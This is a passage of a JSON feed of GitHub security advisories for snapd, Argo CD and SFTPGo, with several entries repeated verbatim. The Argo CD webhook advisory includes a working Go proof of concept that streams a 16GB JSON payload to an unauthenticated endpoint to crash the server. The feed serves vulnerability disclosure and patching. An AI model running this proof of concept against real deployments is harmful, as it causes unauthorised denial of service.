href=\"https://github.com/snapcore/snapd/commit/b66fee81606a1c05f965a876ccbaf44174194063\">https://github.com/snapcore/snapd/commit/b66fee81606a1c05f965a876ccbaf44174194063</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-69p6-gp5x-j269\">https://github.com/advisories/GHSA-69p6-gp5x-j269</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-69p6-gp5x-j269",
            "title": "[github.com/snapcore/snapd] snapd failed to properly check the destination of symbolic links when extracting a snap",
            "date_modified": "2024-07-26T16:39:57.000Z",
            "date_published": "2024-07-25T21:31:20.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-69p6-gp5x-j269"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Argo CD v2.11.3 and before, discovering that even if the user's <code>p, role:myrole, exec, create, */*, allow</code> permissions are revoked, the user can still send any Websocket message, which allows the user to view sensitive information. Even though they shouldn't have such access.</p>\n<h2 id=\"description\">Description</h2>\n<p>Argo CD has a Web-based terminal that allows you to get a shell inside a running pod, just like you would with kubectl exec. However, when the administrator enables this function and grants permission to the user <code>p, role:myrole, exec, create, */*, allow</code>, even if the user revokes this permission, the user can still perform operations in the container, as long as the user keeps the terminal view open for a long time. CVE-2023-40025 Although the token expiration and revocation of the user are fixed, however, the fix does not address the situation of revocation of only user <code>p, role:myrole, exec, create, */*, allow</code> permissions, which may still lead to the leakage of sensitive information.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>A patch for this vulnerability has been released in the following Argo CD versions:</p>\n<p>v2.11.7\nv2.10.16\nv2.9.21</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<p>Open an issue in <a href=\"https://github.com/argoproj/argo-cd/issues\">the Argo CD issue tracker</a> or <a href=\"https://github.com/argoproj/argo-cd/discussions\">discussions</a>\nJoin us on <a href=\"https://argoproj.github.io/community/join-slack\">Slack</a> in channel #argo-cd</p>\n<h3 id=\"credits\">Credits</h3>\n<p>This vulnerability was found &amp; reported by \nShengjie Li, Huazhong University of Science and Technology\nZhi Li, Huazhong University of Science and Technology\nWeijie Liu, Nankai University</p>\n<p>The Argo team would like to thank these contributors for their responsible disclosure and constructive communications during the resolve of this issue</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/argoproj/argo-cd/security/advisories/GHSA-v8wx-v5jq-qhhw\">https://github.com/argoproj/argo-cd/security/advisories/GHSA-v8wx-v5jq-qhhw</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-41666\">https://nvd.nist.gov/vuln/detail/CVE-2024-41666</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/05edb2a9ca48f0f10608c1b49fbb0cf7164f6476\">https://github.com/argoproj/argo-cd/commit/05edb2a9ca48f0f10608c1b49fbb0cf7164f6476</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/e96f32d233504101ddac028a5bf8117433d333d6\">https://github.com/argoproj/argo-cd/commit/e96f32d233504101ddac028a5bf8117433d333d6</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/ef535230d8bd8ad7b18aab1ea1063e9751d348c4\">https://github.com/argoproj/argo-cd/commit/ef535230d8bd8ad7b18aab1ea1063e9751d348c4</a></li>\n<li><a href=\"https://drive.google.com/file/d/1Fynj5Sho8Lf8CETqsNXZyPKlTDdmgJuN/view?usp=sharing\">https://drive.google.com/file/d/1Fynj5Sho8Lf8CETqsNXZyPKlTDdmgJuN/view?usp=sharing</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-v8wx-v5jq-qhhw\">https://github.com/advisories/GHSA-v8wx-v5jq-qhhw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-v8wx-v5jq-qhhw",
            "title": "[github.com/argoproj/argo-cd] The Argo CD web terminal session does not handle the revocation of user permissions properly",
            "date_modified": "2024-07-24T20:54:03.000Z",
            "date_published": "2024-07-24T20:54:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-v8wx-v5jq-qhhw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Argo CD v2.11.3 and before, discovering that even if the user's <code>p, role:myrole, exec, create, */*, allow</code> permissions are revoked, the user can still send any Websocket message, which allows the user to view sensitive information. Even though they shouldn't have such access.</p>\n<h2 id=\"description\">Description</h2>\n<p>Argo CD has a Web-based terminal that allows you to get a shell inside a running pod, just like you would with kubectl exec. However, when the administrator enables this function and grants permission to the user <code>p, role:myrole, exec, create, */*, allow</code>, even if the user revokes this permission, the user can still perform operations in the container, as long as the user keeps the terminal view open for a long time. CVE-2023-40025 Although the token expiration and revocation of the user are fixed, however, the fix does not address the situation of revocation of only user <code>p, role:myrole, exec, create, */*, allow</code> permissions, which may still lead to the leakage of sensitive information.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>A patch for this vulnerability has been released in the following Argo CD versions:</p>\n<p>v2.11.7\nv2.10.16\nv2.9.21</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<p>Open an issue in <a href=\"https://github.com/argoproj/argo-cd/issues\">the Argo CD issue tracker</a> or <a href=\"https://github.com/argoproj/argo-cd/discussions\">discussions</a>\nJoin us on <a href=\"https://argoproj.github.io/community/join-slack\">Slack</a> in channel #argo-cd</p>\n<h3 id=\"credits\">Credits</h3>\n<p>This vulnerability was found &amp; reported by \nShengjie Li, Huazhong University of Science and Technology\nZhi Li, Huazhong University of Science and Technology\nWeijie Liu, Nankai University</p>\n<p>The Argo team would like to thank these contributors for their responsible disclosure and constructive communications during the resolve of this issue</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/argoproj/argo-cd/security/advisories/GHSA-v8wx-v5jq-qhhw\">https://github.com/argoproj/argo-cd/security/advisories/GHSA-v8wx-v5jq-qhhw</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-41666\">https://nvd.nist.gov/vuln/detail/CVE-2024-41666</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/05edb2a9ca48f0f10608c1b49fbb0cf7164f6476\">https://github.com/argoproj/argo-cd/commit/05edb2a9ca48f0f10608c1b49fbb0cf7164f6476</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/e96f32d233504101ddac028a5bf8117433d333d6\">https://github.com/argoproj/argo-cd/commit/e96f32d233504101ddac028a5bf8117433d333d6</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/ef535230d8bd8ad7b18aab1ea1063e9751d348c4\">https://github.com/argoproj/argo-cd/commit/ef535230d8bd8ad7b18aab1ea1063e9751d348c4</a></li>\n<li><a href=\"https://drive.google.com/file/d/1Fynj5Sho8Lf8CETqsNXZyPKlTDdmgJuN/view?usp=sharing\">https://drive.google.com/file/d/1Fynj5Sho8Lf8CETqsNXZyPKlTDdmgJuN/view?usp=sharing</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-v8wx-v5jq-qhhw\">https://github.com/advisories/GHSA-v8wx-v5jq-qhhw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-v8wx-v5jq-qhhw",
            "title": "[github.com/argoproj/argo-cd] The Argo CD web terminal session does not handle the revocation of user permissions properly",
            "date_modified": "2024-07-24T20:54:03.000Z",
            "date_published": "2024-07-24T20:54:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-v8wx-v5jq-qhhw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Argo CD v2.11.3 and before, discovering that even if the user's <code>p, role:myrole, exec, create, */*, allow</code> permissions are revoked, the user can still send any Websocket message, which allows the user to view sensitive information. Even though they shouldn't have such access.</p>\n<h2 id=\"description\">Description</h2>\n<p>Argo CD has a Web-based terminal that allows you to get a shell inside a running pod, just like you would with kubectl exec. However, when the administrator enables this function and grants permission to the user <code>p, role:myrole, exec, create, */*, allow</code>, even if the user revokes this permission, the user can still perform operations in the container, as long as the user keeps the terminal view open for a long time. CVE-2023-40025 Although the token expiration and revocation of the user are fixed, however, the fix does not address the situation of revocation of only user <code>p, role:myrole, exec, create, */*, allow</code> permissions, which may still lead to the leakage of sensitive information.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>A patch for this vulnerability has been released in the following Argo CD versions:</p>\n<p>v2.11.7\nv2.10.16\nv2.9.21</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<p>Open an issue in <a href=\"https://github.com/argoproj/argo-cd/issues\">the Argo CD issue tracker</a> or <a href=\"https://github.com/argoproj/argo-cd/discussions\">discussions</a>\nJoin us on <a href=\"https://argoproj.github.io/community/join-slack\">Slack</a> in channel #argo-cd</p>\n<h3 id=\"credits\">Credits</h3>\n<p>This vulnerability was found &amp; reported by \nShengjie Li, Huazhong University of Science and Technology\nZhi Li, Huazhong University of Science and Technology\nWeijie Liu, Nankai University</p>\n<p>The Argo team would like to thank these contributors for their responsible disclosure and constructive communications during the resolve of this issue</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/argoproj/argo-cd/security/advisories/GHSA-v8wx-v5jq-qhhw\">https://github.com/argoproj/argo-cd/security/advisories/GHSA-v8wx-v5jq-qhhw</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-41666\">https://nvd.nist.gov/vuln/detail/CVE-2024-41666</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/05edb2a9ca48f0f10608c1b49fbb0cf7164f6476\">https://github.com/argoproj/argo-cd/commit/05edb2a9ca48f0f10608c1b49fbb0cf7164f6476</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/e96f32d233504101ddac028a5bf8117433d333d6\">https://github.com/argoproj/argo-cd/commit/e96f32d233504101ddac028a5bf8117433d333d6</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/ef535230d8bd8ad7b18aab1ea1063e9751d348c4\">https://github.com/argoproj/argo-cd/commit/ef535230d8bd8ad7b18aab1ea1063e9751d348c4</a></li>\n<li><a href=\"https://drive.google.com/file/d/1Fynj5Sho8Lf8CETqsNXZyPKlTDdmgJuN/view?usp=sharing\">https://drive.google.com/file/d/1Fynj5Sho8Lf8CETqsNXZyPKlTDdmgJuN/view?usp=sharing</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-v8wx-v5jq-qhhw\">https://github.com/advisories/GHSA-v8wx-v5jq-qhhw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-v8wx-v5jq-qhhw",
            "title": "[github.com/argoproj/argo-cd] The Argo CD web terminal session does not handle the revocation of user permissions properly",
            "date_modified": "2024-07-24T20:54:03.000Z",
            "date_published": "2024-07-24T20:54:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-v8wx-v5jq-qhhw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>In SFTPGo 2.6.2, the JWT implementation lacks certain security measures, such as using JWT ID (JTI) claims, nonces, and proper expiration and invalidation mechanisms.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-40430\">https://nvd.nist.gov/vuln/detail/CVE-2024-40430</a></li>\n<li><a href=\"https://alexsecurity.rocks/posts/cve-2024-40430\">https://alexsecurity.rocks/posts/cve-2024-40430</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x72p-g37q-4xr9\">https://github.com/advisories/GHSA-x72p-g37q-4xr9</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x72p-g37q-4xr9",
            "title": "[github.com/drakkan/sftpgo/v2] SFTPGo's JWT implmentation lacks certain security measures",
            "date_modified": "2024-07-26T21:37:18.000Z",
            "date_published": "2024-07-22T09:31:55.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x72p-g37q-4xr9"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>This report details a security vulnerability in Argo CD, where an unauthenticated attacker can send a specially crafted large JSON payload to the /api/webhook endpoint, causing excessive memory allocation that leads to service disruption by triggering an Out Of Memory (OOM) kill. The issue poses a high risk to the availability of Argo CD deployments.</p>\n<h3 id=\"details\">Details</h3>\n<p>The webhook server always listens to requests. By default, the endpoint doesn't require authentication. It's possible to send a large, malicious request with headers (in this case \"X-GitHub-Event: push\") that will make ArgoCD start allocating memory to parse the incoming request. Since the request can be constructed client-side without allocating large amounts of memory, it can be arbitrarily large. Eventually, the argocd-server component will get OOMKilled as it consumes all its available memory.</p>\n<p>The fix would be to enforce a limit on the size of the request being parsed.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Port-forward to the argocd-server service, like so:</p>\n<pre><code class=\"language-console\">kubectl port-forward svc/argocd-server -n argocd 8080:443\n</code></pre>\n<p>Run the below code:</p>\n<pre><code class=\"language-go\">package main\n\nimport (\n    \"crypto/tls\"\n    \"io\"\n    \"net/http\"\n)\n\n// Define a custom io.Reader that generates a large dummy JSON payload.\ntype DummyJSONReader struct {\n    size int64 // Total size to generate\n    read int64 // Bytes already generated\n}\n\n// Read generates the next chunk of the dummy JSON payload.\nfunc (r *DummyJSONReader) Read(p []byte) (n int, err error) {\n    if r.read &gt;= r.size {\n        return 0, io.EOF // Finished generating\n    }\n\n    start := false\n    if r.read == 0 {\n        // Start of JSON\n        p[0] = '{'\n        p[1] = '\"'\n        p[2] = 'd'\n        p[3] = 'a'\n        p[4] = 't'\n        p[5] = 'a'\n        p[6] = '\"'\n        p[7] = ':'\n        p[8] = '\"'\n        n = 9\n        start = true\n    }\n\n    for i := n; i &lt; len(p); i++ {\n        if r.read+int64(i)-int64(n)+1 == r.size-1 {\n            // End of JSON\n            p[i] = '\"'\n            p[i+1] = '}'\n            r.read += int64(i) + 2 - int64(n)\n            return i + 2 - n, nil\n        } else {\n            p[i] = 'x' // Dummy data\n        }\n    }\n\n    r.read += int64(len(p)) - int64(n)\n    if start {\n        return len(p), nil\n    }\n    return len(p) - n, nil\n}\n\nfunc main() {\n    // Initialize the custom reader with the desired size (16GB in this case).\n    payloadSize := int64(16) * 1024 * 1024 * 1024 // 16GB\n    reader := &amp;DummyJSONReader{size: payloadSize}\n\n    // HTTP client setup\n    httpClient := &amp;http.Client{\n        Timeout: 0, // No timeout\n        Transport: &amp;http.Transport{\n            TLSClientConfig: &amp;tls.Config{InsecureSkipVerify: true},\n        },\n    }\n\n    req, err := http.NewRequest(\"POST\", \"https://localhost:8080/api/webhook\", reader)\n    if err != nil {\n        panic(err)\n    }\n\n    // Set headers\n    req.Header.Set(\"Content-Type\", \"application/json\")\n    req.Header.Set(\"X-GitHub-Event\", \"push\")\n\n    resp, err := httpClient.Do(req)\n    if err != nil {\n        panic(err)\n    }\n    defer resp.Body.Close()\n\n    println(\"Response status code:\", resp.StatusCode)\n}\n</code></pre>\n<h3 id=\"patches\">Patches</h3>\n<p>A patch for this vulnerability has been released in the following Argo CD versions:</p>\n<p>v2.11.6\nv2.10.15\nv2.9.20</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<p>Open an issue in <a href=\"https://github.com/argoproj/argo-cd/issues\">the Argo CD issue tracker</a> or <a href=\"https://github.com/argoproj/argo-cd/discussions\">discussions</a>\nJoin us on <a href=\"https://argoproj.github.io/community/join-slack\">Slack</a> in channel #argo-cd</p>\n<h3 id=\"credits\">Credits</h3>\n<p>This vulnerability was found &amp; reported by Jakub Ciolek</p>\n<p>The Argo team would like to thank these contributors for their responsible disclosure and constructive communications during the resolve of this issue</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/argoproj/argo-cd/security/advisories/GHSA-jmvp-698c-4x3w\">https://github.com/argoproj/argo-cd/security/advisories/GHSA-jmvp-698c-4x3w</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/46c0c0b64deaab1ece70cb701030b76668ad0cdc\">https://github.com/argoproj/argo-cd/commit/46c0c0b64deaab1ece70cb701030b76668ad0cdc</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/540e3a57b90eb3655db54793332fac86bcc38b36\">https://github.com/argoproj/argo-cd/commit/540e3a57b90eb3655db54793332fac86bcc38b36</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/d881ee78949e23160a0b280bb159e4d3d625a4df\">https://github.com/argoproj/argo-cd/commit/d881ee78949e23160a0b280bb159e4d3d625a4df</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-40634\">https://nvd.nist.gov/vuln/detail/CVE-2024-40634</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jmvp-698c-4x3w\">https://github.com/advisories/GHSA-jmvp-698c-4x3w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jmvp-698c-4x3w",
            "title": "[github.com/argoproj/argo-cd/v2] Argo CD Unauthenticated Denial of Service (DoS) Vulnerability via /api/webhook Endpoint",
            "date_modified": "2024-07-22T19:58:30.000Z",
            "date_published": "2024-07-22T17:20:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jmvp-698c-4x3w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>This report details a security vulnerability in Argo CD, where an unauthenticated attacker can send a specially crafted large JSON payload to the /api/webhook endpoint, causing excessive memory allocation that leads to service disruption by triggering an Out Of Memory (OOM) kill. The issue poses a high risk to the availability of Argo CD deployments.</p>\n<h3 id=\"details\">Details</h3>\n<p>The webhook server always listens to requests. By default, the endpoint doesn't require authentication. It's possible to send a large, malicious request with headers (in this case \"X-GitHub-Event: push\") that will make ArgoCD start allocating memory to parse the incoming request. Since the request can be constructed client-side without allocating large amounts of memory, it can be arbitrarily large. Eventually, the argocd-server component will get OOMKilled as it consumes all its available memory.</p>\n<p>The fix would be to enforce a limit on the size of the request being parsed.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Port-forward to the argocd-server service, like so:</p>\n<pre><code class=\"language-console\">kubectl port-forward svc/argocd-server -n argocd 8080:443\n</code></pre>\n<p>Run the below code:</p>\n<pre><code class=\"language-go\">package main\n\nimport (\n    \"crypto/tls\"\n    \"io\"\n    \"net/http\"\n)\n\n// Define a custom io.Reader that generates a large dummy JSON payload.\ntype DummyJSONReader struct {\n    size int64 // Total size to generate\n    read int64 // Bytes already generated\n}\n\n// Read generates the next chunk of the dummy JSON payload.\nfunc (r *DummyJSONReader) Read(p []byte) (n int, err error) {\n    if r.read &gt;= r.size {\n        return 0, io.EOF // Finished generating\n    }\n\n    start := false\n    if r.read == 0 {\n        // Start of JSON\n        p[0] = '{'\n        p[1] = '\"'\n        p[2] = 'd'\n        p[3] = 'a'\n        p[4] = 't'\n        p[5] = 'a'\n        p[6] = '\"'\n        p[7] = ':'\n        p[8] = '\"'\n        n = 9\n        start = true\n    }\n\n    for i := n; i &lt; len(p); i++ {\n        if r.read+int64(i)-int64(n)+1 == r.size-1 {\n            // End of JSON\n            p[i] = '\"'\n            p[i+1] = '}'\n            r.read += int64(i) + 2 - int64(n)\n            return i + 2 - n, nil\n        } else {\n            p[i] = 'x' // Dummy data\n        }\n    }\n\n    r.read += int64(len(p)) - int64(n)\n    if start {\n        return len(p), nil\n    }\n    return len(p) - n, nil\n}\n\nfunc main() {\n    // Initialize the custom reader with the desired size (16GB in this case).\n    payloadSize := int64(16) * 1024 * 1024 * 1024 // 16GB\n    reader := &amp;DummyJSONReader{size: payloadSize}\n\n    // HTTP client setup\n    httpClient := &amp;http.Client{\n        Timeout: 0, // No timeout\n        Transport: &amp;http.Transport{\n            TLSClientConfig: &amp;tls.Config{InsecureSkipVerify: true},\n        },\n    }\n\n    req, err := http.NewRequest(\"POST\", \"https://localhost:8080/api/webhook\", reader)\n    if err != nil {\n        panic(err)\n    }\n\n    // Set headers\n    req.Header.Set(\"Content-Type\", \"application/json\")\n    req.Header.Set(\"X-GitHub-Event\", \"push\")\n\n    resp, err := httpClient.Do(req)\n    if err != nil {\n        panic(err)\n    }\n    defer resp.Body.Close()\n\n    println(\"Response status code:\", resp.StatusCode)\n}\n</code></pre>\n<h3 id=\"patches\">Patches</h3>\n<p>A patch for this vulnerability has been released in the following Argo CD versions:</p>\n<p>v2.11.6\nv2.10.15\nv2.9.20</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<p>Open an issue in <a href=\"https://github.com/argoproj/argo-cd/issues\">the Argo CD issue tracker</a> or <a href=\"https://github.com/argoproj/argo-cd/discussions\">discussions</a>\nJoin us on <a href=\"https://argoproj.github.io/community/join-slack\">Slack</a> in channel #argo-cd</p>\n<h3 id=\"credits\">Credits</h3>\n<p>This vulnerability was found &amp; reported by Jakub Ciolek</p>\n<p>The Argo team would like to thank these contributors for their responsible disclosure and constructive communications during the resolve of this issue</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/argoproj/argo-cd/security/advisories/GHSA-jmvp-698c-4x3w\">https://github.com/argoproj/argo-cd/security/advisories/GHSA-jmvp-698c-4x3w</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/46c0c0b64deaab1ece70cb701030b76668ad0cdc\">https://github.com/argoproj/argo-cd/commit/46c0c0b64deaab1ece70cb701030b76668ad0cdc</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/540e3a57b90eb3655db54793332fac86bcc38b36\">https://github.com/argoproj/argo-cd/commit/540e3a57b90eb3655db54793332fac86bcc38b36</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/d881ee78949e23160a0b280bb159e4d3d625a4df\">https://github.com/argoproj/argo-cd/commit/d881ee78949e23160a0b280bb159e4d3d625a4df</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-40634\">https://nvd.nist.gov/vuln/detail/CVE-2024-40634</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jmvp-698c-4x3w\">https://github.com/advisories/GHSA-jmvp-698c-4x3w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jmvp-698c-4x3w",
            "title": "[github.com/argoproj/argo-cd/v2] Argo CD Unauthenticated Denial of Service (DoS) Vulnerability via /api/webhook Endpoint",
            "date_modified": "2024-07-22T19:58:30.000Z",
            "date_published": "2024-07-22T17:20:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jmvp-698c-4x3w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>This report details a security vulnerability in Argo CD, where an unauthenticated attacker can send a specially crafted large JSON payload to the /api/webhook endpoint, causing excessive memory allocation that leads to service disruption by triggering an Out Of Memory (OOM) kill. The issue poses a high risk to the availability of Argo CD deployments.</p>\n<h3 id=\"details\">Details</h3>\n<p>The webhook server always listens to requests. By default, the endpoint doesn't require authentication. It's possible to send a large, malicious request with headers (in this case \"X-GitHub-Event: push\") that will make ArgoCD start allocating memory to parse the incoming request. Since the request can be constructed client-side without allocating large amounts of memory, it can be arbitrarily large. Eventually, the argocd-server component will get OOMKilled as it consumes all its available memory.</p>\n<p>The fix would be to enforce a limit on the size of the request being parsed.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Port-forward to the argocd-server service, like so:</p>\n<pre><code class=\"language-console\">kubectl port-forward svc/argocd-server -n argocd 8080:443\n</code></pre>\n<p>Run the below code:</p>\n<pre><code class=\"language-go\">package main\n\nimport (\n    \"crypto/tls\"\n    \"io\"\n    \"net/http\"\n)\n\n// Define a custom io.Reader that generates a large dummy JSON payload.\ntype DummyJSONReader struct {\n    size int64 // Total size to generate\n    read int64 // Bytes already generated\n}\n\n// Read generates the next chunk of the dummy JSON payload.\nfunc (r *DummyJSONReader) Read(p []byte) (n int, err error) {\n    if r.read &gt;= r.size {\n        return 0, io.EOF // Finished generating\n    }\n\n    start := false\n    if r.read == 0 {\n        // Start of JSON\n        p[0] = '{'\n        p[1] = '\"'\n        p[2] = 'd'\n        p[3] = 'a'\n        p[4] = 't'\n        p[5] = 'a'\n        p[6] = '\"'\n        p[7] = ':'\n        p[8] = '\"'\n        n = 9\n        start = true\n    }\n\n    for i := n; i &lt; len(p); i++ {\n        if r.read+int64(i)-int64(n)+1 == r.size-1 {\n            // End of JSON\n            p[i] = '\"'\n            p[i+1] = '}'\n            r.read += int64(i) + 2 - int64(n)\n            return i + 2 - n, nil\n        } else {\n            p[i] = 'x' // Dummy data\n        }\n    }\n\n    r.read += int64(len(p)) - int64(n)\n    if start {\n        return len(p), nil\n    }\n    return len(p) - n, nil\n}\n\nfunc main() {\n    // Initialize the custom reader with the desired size (16GB in this case).\n    payloadSize := int64(16) * 1024 * 1024 * 1024 // 16GB\n    reader := &amp;DummyJSONReader{size: payloadSize}\n\n    // HTTP client setup\n    httpClient := &amp;http.Client{\n        Timeout: 0, // No timeout\n        Transport: &amp;http.Transport{\n            TLSClientConfig: &amp;tls.Config{InsecureSkipVerify: true},\n        },\n    }\n\n    req, err := http.NewRequest(\"POST\", \"https://localhost:8080/api/webhook\", reader)\n    if err != nil {\n        panic(err)\n    }\n\n    // Set headers\n    req.Header.Set(\"Content-Type\", \"application/json\")\n    req.Header.Set(\"X-GitHub-Event\", \"push\")\n\n    resp, err := httpClient.Do(req)\n    if err != nil {\n        panic(err)\n    }\n    defer resp.Body.Close()\n\n    println(\"Response status code:\", resp.StatusCode)\n}\n</code></pre>\n<h3 id=\"patches\">Patches</h3>\n<p>A patch for this vulnerability has been released in the following Argo CD versions:</p>\n<p>v2.11.6\nv2.10.15\nv2.9.20</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<p>Open an issue in <a href=\"https://github.com/argoproj/argo-cd/issues\">the Argo CD issue tracker</a> or <a href=\"https://github.com/argoproj/argo-cd/discussions\">discussions</a>\nJoin us on <a href=\"https://argoproj.github.io/community/join-slack\">Slack</a> in channel #argo-cd</p>\n<h3 id=\"credits\">Credits</h3>\n<p>This vulnerability was found &amp; reported by Jakub Ciolek</p>\n<p>The Argo team would like to thank these contributors for their responsible disclosure and constructive communications during the resolve of this issue</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/argoproj/argo-cd/security/advisories/GHSA-jmvp-698c-4x3w\">https://github.com/argoproj/argo-cd/security/advisories/GHSA-jmvp-698c-4x3w</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/46c0c0b64deaab1ece70cb701030b76668ad0cdc\">https://github.com/argoproj/argo-cd/commit/46c0c0b64deaab1ece70cb701030b76668ad0cdc</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/540e3a57b90eb3655db54793332fac86bcc38b36\">https://github.com/argoproj/argo-cd/commit/540e3a57b90eb3655db54793332fac86bcc38b36</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/d881ee78949e23160a0b280bb159e4d3d625a4df\">https://github.com/argoproj/argo-cd/commit/d881ee78949e23160a0b280bb159e4d3d625a4df</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-40634\">https://nvd.nist.gov/vuln/detail/CVE-2024-40634</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jmvp-698c-4x3w\">https://github.com/advisories/GHSA-jmvp-698c-4x3w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jmvp-698c-4x3w",
            "title": "[github.com/argoproj/argo-cd/v2] Argo CD Unauthenticated Denial of Service (DoS) Vulnerability via /api/webhook Endpoint",
            "date_modified": "2024-07-22T19:58:30.000Z",
            "date_published": "2024-07-22T17:20:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jmvp-698c-4x3w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>This report details a security vulnerability in Argo CD, where an unauthenticated attacker can send a specially crafted large JSON payload to the /api/webhook endpoint, causing excessive memory allocation that leads to service disruption by triggering an Out Of Memory (OOM) kill. The issue poses a high risk to the availability of Argo CD deployments.</p>\n<h3 id=\"details\">Details</h3>\n<p>The webhook server always listens to requests. By default, the endpoint doesn't require authentication. It's possible to send a large, malicious request with headers (in this case \"X-GitHub-Event: push\") that will make ArgoCD start allocating memory to parse the incoming request. Since the request can be constructed client-side without allocating large amounts of memory, it can be arbitrarily large. Eventually, the argocd-server component will get OOMKilled as it consumes all its available memory.</p>\n<p>The fix would be to enforce a limit on the size of the request being parsed.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Port-forward to the argocd-server service, like so:</p>\n<pre><code class=\"language-console\">kubectl port-forward svc/argocd-server -n argocd 8080:443\n</code></pre>\n<p>Run the below code:</p>\n<pre><code class=\"language-go\">package main\n\nimport (\n    \"crypto/tls\"\n    \"io\"\n    \"net/http\"\n)\n\n// Define a custom io.Reader that generates a large dummy JSON payload.\ntype DummyJSONReader struct {\n    size int64 // Total size to generate\n    read int64 // Bytes already generated\n}\n\n// Read generates the next chunk of the dummy JSON payload.\nfunc (r *DummyJSONReader) Read(p []byte) (n int, err error) {\n    if r.read &gt;= r.size {\n        return 0, io.EOF // Finished generating\n    }\n\n    start := false\n    if r.read == 0 {\n        // Start of JSON\n        p[0] = '{'\n        p[1] = '\"'\n        p[2] = 'd'\n        p[3] = 'a'\n        p[4] = 't'\n        p[5] = 'a'\n        p[6] = '\"'\n        p[7] = ':'\n        p[8] = '\"'\n        n = 9\n        start = 